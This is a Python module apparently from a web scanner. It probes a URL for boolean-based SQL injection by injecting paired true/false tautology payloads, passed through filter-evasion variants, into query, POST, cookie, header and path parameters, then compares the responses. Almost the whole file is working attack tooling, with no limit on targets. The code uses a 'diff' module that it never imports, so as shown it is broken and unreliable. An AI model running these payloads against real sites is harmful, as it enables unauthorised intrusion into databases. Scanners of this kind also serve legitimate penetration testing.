import urllib.parse
from ..utils import send_request, evasion_variants, is_response_stable

_CACHE: dict[tuple, str] = {}


def _cache_key(
    url: str,
    method: str,
    data: dict | None,
    cookies: dict | None,
    headers: dict | None,
) -> tuple:
    data_enc = urllib.parse.urlencode(sorted(data.items())) if data else ""
    cookies_t = tuple(sorted((cookies or {}).items()))
    headers_t = tuple(sorted((headers or {}).items()))
    return (url, method, data_enc, cookies_t, headers_t)

PAYLOADS_TRUE = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1-- ",
    '" OR 1=1-- '
]

PAYLOADS_FALSE = [
    "' OR '1'='2",
    '" OR "1"="2',
    "' OR 1=2-- ",
    '" OR 1=2-- '
]

def fetch(
    url: str,
    method: str = "get",
    data: dict | None = None,
    cookies: dict | None = None,
    headers: dict | None = None,
    *,
    use_cache: bool = False,
) -> str:
    """Fetch a URL and return the body as text."""
    key = _cache_key(url, method, data, cookies, headers)
    if use_cache and key in _CACHE:
        return _CACHE[key]

    body = send_request(url, method=method, data=data, cookies=cookies, headers=headers)

    if use_cache:
        _CACHE[key] = body

    return body


def test_parameter(
    url: str,
    param: str,
    value: str,
    method: str = "get",
    data: dict | None = None,
    cookies: dict | None = None,
    headers: dict | None = None,
    location: str = "query",
    path_index: int | None = None,
):
    """Attempt boolean-based SQL injection on a parameter."""
    data = data or {}
    cookies = cookies or {}
    headers = headers or {}
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    if location == "cookie":
        original = cookies.get(param, "")
        try:
            baseline_body = fetch(
                url,
                method=method,
                data=data if method.lower() == "post" else None,
                cookies=cookies,
                headers=headers,
                use_cache=True,
            )
        except Exception as e:
            baseline_body = str(e)
    elif location == "header":
        original = headers.get(param, "")
        try:
            baseline_body = fetch(
                url,
                method=method,
                data=data if method.lower() == "post" else None,
                cookies=cookies,
                headers=headers,
                use_cache=True,
            )
        except Exception as e:
            baseline_body = str(e)
    elif location == "path" and path_index is not None:
        segments = parsed.path.split("/")
        original = segments[path_index]
        try:
            baseline_body = fetch(
                url,
                method=method,
                data=data if method.lower() == "post" else None,
                cookies=cookies,
                headers=headers,
                use_cache=True,
            )
        except Exception as e:
            baseline_body = str(e)
    elif method.lower() == "get":
        original = query.get(param, [''])[0]
        try:
            baseline_body = fetch(
                url,
                cookies=cookies,
                headers=headers,
                use_cache=True,
            )
        except Exception as e:
            baseline_body = str(e)
    else:
        original = data.get(param, "")
        try:
            baseline_body = fetch(
                url,
                method="post",
                data=data,
                cookies=cookies,
                headers=headers,
                use_cache=True,
            )
        except Exception as e:
            baseline_body = str(e)
    stable = is_response_stable(
        url,
        method=method,
        data=data if method.lower() == "post" else None,
        cookies=cookies,
        headers=headers,
        attempts=2,
        threshold=0.2,
    )

    results = []
    for p_true, p_false in zip(PAYLOADS_TRUE, PAYLOADS_FALSE):
        true_vars = evasion_variants(p_true)
        false_vars = evasion_variants(p_false)
        for v_true, v_false in zip(true_vars, false_vars):
            if location == "cookie":
                new_cookies = cookies.copy()
                new_cookies[param] = original + v_true
                true_url = url
                try:
                    body_true = fetch(
                        true_url,
                        method=method,
                        data=data if method.lower() == "post" else None,
                        cookies=new_cookies,
                        headers=headers,
                    )
                except Exception as e:
                    body_true = str(e)

                new_cookies[param] = original + v_false
                false_url = url
                try:
                    body_false = fetch(
                        false_url,
                        method=method,
                        data=data if method.lower() == "post" else None,
                        cookies=new_cookies,
                        headers=headers,
                    )
                except Exception as e:
                    body_false = str(e)
            elif location == "header":
                new_headers = headers.copy()
                new_headers[param] = original + v_true
                true_url = url
                try:
                    body_true = fetch(
                        true_url,
                        method=method,
                        data=data if method.lower() == "post" else None,
                        cookies=cookies,
                        headers=new_headers,
                    )
                except Exception as e:
                    body_true = str(e)

                new_headers[param] = original + v_false
                false_url = url
                try:
                    body_false = fetch(
                        false_url,
                        method=method,
                        data=data if method.lower() == "post" else None,
                        cookies=cookies,
                        headers=new_headers,
                    )
                except Exception as e:
                    body_false = str(e)
            elif location == "path" and path_index is not None:
                segments = parsed.path.split("/")
                segments[path_index] = original + v_true
                new_path = "/".join(segments)
                true_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
                try:
                    body_true = fetch(
                        true_url,
                        method=method,
                        data=data if method.lower() == "post" else None,
                        cookies=cookies,
                        headers=headers,
                    )
                except Exception as e:
                    body_true = str(e)

                segments[path_index] = original + v_false
                new_path = "/".join(segments)
                false_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
                try:
                    body_false = fetch(
                        false_url,
                        method=method,
                        data=data if method.lower() == "post" else None,
                        cookies=cookies,
                        headers=headers,
                    )
                except Exception as e:
                    body_false = str(e)
            elif method.lower() == "get":
                query[param] = original + v_true
                new_query = urllib.parse.urlencode(query, doseq=True)
                true_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                try:
                    body_true = fetch(true_url, cookies=cookies, headers=headers)
                except Exception as e:
                    body_true = str(e)

                query[param] = original + v_false
                new_query = urllib.parse.urlencode(query, doseq=True)
                false_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                try:
                    body_false = fetch(false_url, cookies=cookies, headers=headers)
                except Exception as e:
                    body_false = str(e)
            else:
                post_true = data.copy()
                post_true[param] = original + v_true
                true_url = url
                try:
                    body_true = fetch(true_url, method="post", data=post_true, cookies=cookies, headers=headers)
                except Exception as e:
                    body_true = str(e)

                post_false = data.copy()
                post_false[param] = original + v_false
                false_url = url
                try:
                    body_false = fetch(false_url, method="post", data=post_false, cookies=cookies, headers=headers)
                except Exception as e:
                    body_false = str(e)

            diff_true = diff.is_significant_diff(baseline_body, body_true)
            diff_false = diff.is_significant_diff(baseline_body, body_false)
            diff_tf = diff.is_significant_diff(body_true, body_false)
            vulnerable = diff_tf and (diff_true != diff_false) and stable
            results.append(
                {
                    'url': true_url,
                    'param': param,
                    'payload': v_true,
                    'vulnerable': vulnerable,
                }
            )
    return results
